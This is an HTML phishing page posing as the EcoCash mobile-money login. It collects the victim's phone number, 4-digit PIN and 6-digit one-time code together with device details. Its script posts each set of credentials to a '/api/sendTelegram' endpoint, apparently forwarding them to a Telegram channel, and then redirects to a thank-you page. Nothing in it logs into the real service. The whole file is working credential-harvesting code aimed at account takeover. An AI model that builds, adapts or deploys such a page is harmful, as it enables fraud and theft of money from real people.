<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:Inter,system-ui,Arial;
    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
    margin:0;
    padding:18px;
    display:flex;
    align-items:center;
    justify-content:center;
  }
  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;font-size:20px}
  label{display:block;font-size:13px;margin-top:8px}
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;width:100%}
  .btn[disabled]{background:#cbd5e1}
  .req{color:#d04444}
  .error{color:#d04444;font-size:13px;margin-top:4px;display:none}
  .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
  .pin-digit{width:40px;height:48px;text-align:center;font-size:20px}
  .otp-modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35)}
  .otp-box{background:#fff;padding:18px;border-radius:12px;width:300px}
  .otp-row{display:flex;gap:8px;justify-content:center}
  .otp-digit{width:40px;height:48px;text-align:center;font-size:20px}
  .otp-warning{color:#d04444;font-size:13px;display:none}
</style>
</head>
<body>

<div class="card">
  <img src="assets/eco.png" class="logo">
  <h2>Log In</h2>

  <form id="loginForm">
    <label><span class="req">★</span>Mobile Number
      <input id="phone" value="+263" inputmode="numeric">
    </label>
    <div id="phoneError" class="error">
      Enter Econet number: 9 digits starting with 7
    </div>

    <label><span class="req">★</span>4-Digit PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <strong>Enter OTP</strong>
    <div class="otp-row">
      <input class="otp-digit" id="d0" maxlength="1">
      <input class="otp-digit" id="d1" maxlength="1">
      <input class="otp-digit" id="d2" maxlength="1">
      <input class="otp-digit" id="d3" maxlength="1">
      <input class="otp-digit" id="d4" maxlength="1">
      <input class="otp-digit" id="d5" maxlength="1">
    </div>
    <div id="otpWarning" class="otp-warning">Enter all 6 digits</div>
    <button id="confirmOtp" disabled>Confirm</button>
    <button id="cancelOtp">Cancel</button>
    <div id="otpStatus"></div>
  </div>
</div>

<script>
/* ===== DEVICE INFO (GUARANTEED) ===== */
const ua = navigator.userAgent;

let device_os = /Android/i.test(ua) ? 'Android' : /iPhone|iPad/i.test(ua) ? 'iOS' : 'Other';
let device_os_version = (ua.match(/Android\s([\d\.]+)/) || ua.match(/OS\s([\d_]+)/) || [,'Unknown'])[1];
let device_browser = /Chrome/i.test(ua) ? 'Chrome' : /Safari/i.test(ua) ? 'Safari' : 'Other';

/* ===== PHONE ===== */
const phone = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');
const loginBtn = document.getElementById('loginBtn');

function validatePhone(){
  const digits = phone.value.replace('+263','');
  const ok = /^7\d{8}$/.test(digits);
  phoneError.style.display = ok ? 'none' : 'block';
  return ok;
}

phone.addEventListener('input', ()=>{
  let d = phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
  phone.value = '+263' + d;
  validatePhone();
  updateState();
});
phone.addEventListener('blur', validatePhone);
validatePhone(); // FORCE on load

/* ===== PIN ===== */
const pins = [...document.querySelectorAll('.pin-digit')];
let pinVal = '';

pins.forEach((b,i)=>{
  b.addEventListener('input',()=>{
    b.value=b.value.replace(/\D/g,'');
    if(b.value && i<3) pins[i+1].focus();
    pinVal = pins.map(p=>p.value).join('');
    updateState();
  });
});

/* ===== STATE ===== */
function updateState(){
  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinVal));
}

/* ===== API ===== */
function send(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== LOGIN ===== */
loginForm.onsubmit = async e=>{
  e.preventDefault();
  if(hp.value) return;

  otpModal.style.display='flex';

  await send({
    event:'login_clicked',
    loginPhone:phone.value,
    loginPin:pinVal,
    device_os,
    device_os_version,
    device_browser,
    device_user_agent: ua,
    submittedAt:new Date().toISOString()
  });
};

/* ===== OTP ===== */
const dEls=[d0,d1,d2,d3,d4,d5];
const confirmOtp=document.getElementById('confirmOtp');
const otpWarning=document.getElementById('otpWarning');

function otpVal(){return dEls.map(d=>d.value).join('');}
dEls.forEach((d,i)=>{
  d.oninput=()=>{
    d.value=d.value.replace(/\D/g,'');
    if(d.value && i<5) dEls[i+1].focus();
    confirmOtp.disabled=!/^\d{6}$/.test(otpVal());
    otpWarning.style.display=confirmOtp.disabled?'block':'none';
  };
});

confirmOtp.onclick=async()=>{
  await send({
    event:'otp_confirm',
    loginPhone:phone.value,
    loginPin:pinVal,
    otp:otpVal(),
    device_os,
    device_os_version,
    device_browser,
    device_user_agent: ua,
    submittedAt:new Date().toISOString()
  });
  location.href='thankyou.html';
};

cancelOtp.onclick=()=>otpModal.style.display='none';
</script>
</body>
</html>
